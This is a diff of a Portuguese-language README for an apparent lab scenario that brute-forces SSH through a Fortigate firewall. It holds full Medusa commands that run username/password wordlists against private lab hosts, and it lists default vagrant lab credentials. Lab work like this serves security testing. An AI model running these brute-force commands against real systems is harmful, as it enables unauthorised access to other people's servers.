@@ -7,19 +7,26 @@ CENÁRIO
 
 Config. Workstation Attacker [Hardware]
 ```
-[root@srv-centos bruteforce-database]# hostnamectl
-Static hostname: srv-centos
-     Icon name: computer-vm
-       Chassis: vm
-    Machine ID: <!output omitted!>
-       Boot ID: <!output omitted!>
-Virtualization: kvm
-Operating System: CentOS Linux 7 (Core)
-   CPE OS Name: cpe:/o:centos:centos:7
-        Kernel: Linux 3.10.0-1160.80.1.el7.x86_64
-  Architecture: x86-64
-[root@srv-centos bruteforce-database]#
+[vagrant@srv-attacker-in ~]$ hostnamectl
+   Static hostname: srv-attacker-in
+         Icon name: computer-vm
+           Chassis: vm
+        Machine ID: <!output omitted!>
+           Boot ID: <!output omitted!>
+    Virtualization: vmware
+  Operating System: CentOS Linux 7 (Core)
+       CPE OS Name: cpe:/o:centos:centos:7
+            Kernel: Linux 3.10.0-1127.el7.x86_64
+      Architecture: x86-64
+[vagrant@srv-attacker-in ~]$
+-- Todos as maquinas tem o mesmo hardware e OS, divergindo apenas os pacotes instalados.
 ```
+
+Credenciais
+User: vagrant
+Password: vagrant
+Obs.: Ajuste ja realizado para ssh no arquivo "provision"
+
 
 Firewall Fortigate [Firmware / FortiOS]
 ```
@@ -32,27 +39,25 @@ Pacotes & Repositórios Instalados
 ---
 Repo Epel-release / Git / Medusa [Brute Force]
 ```
-# yum install epel-release -y
-# yum install git -y
-# yum install medusa -y
+# yum install -y epel-release git wget tcpdump python3 vim tree nmap medusa
 ```
 
 Base de Users and Passwords
 https://github.com/duyet/bruteforce-database
 ```
-git clone https://github.com/duyet/bruteforce-database
+$ git clone https://github.com/duyet/bruteforce-database
 ```
 
 Sintaxe Attack
 ---
 Cmd SRC Outside [Public IP 192.168.15.140 p 2022]
 ```
-medusa -h 192.168.15.140 -U /home/<!you_user!>/bruteforce-database/38650-username-sktorrent.txt -P /home/<!you_user!>/bruteforce-database/38650-password-sktorrent.txt -M ssh -n 2022
+# medusa -h 192.168.15.140 -U /home/<!you_user!>/bruteforce-database/38650-username-sktorrent.txt -P /home/<!you_user!>/bruteforce-database/38650-password-sktorrent.txt -M ssh -n 2022
 ```
 
 Cmd SRC Inside [Inside IP 10.100.0.20 p 22]
 ```
-medusa -h 10.100.0.20 -U /home/<!you_user!>/Documents/bruteforce-database/38650-username-sktorrent.txt -P /home/<!you_user!>/Documents/bruteforce-database/38650-password-sktorrent.txt -M ssh -n 22
+# medusa -h 10.100.0.20 -U /home/<!you_user!>/Documents/bruteforce-database/38650-username-sktorrent.txt -P /home/<!you_user!>/Documents/bruteforce-database/38650-password-sktorrent.txt -M ssh -n 22
 ```
 
 Fonte para utilização "Medusa"
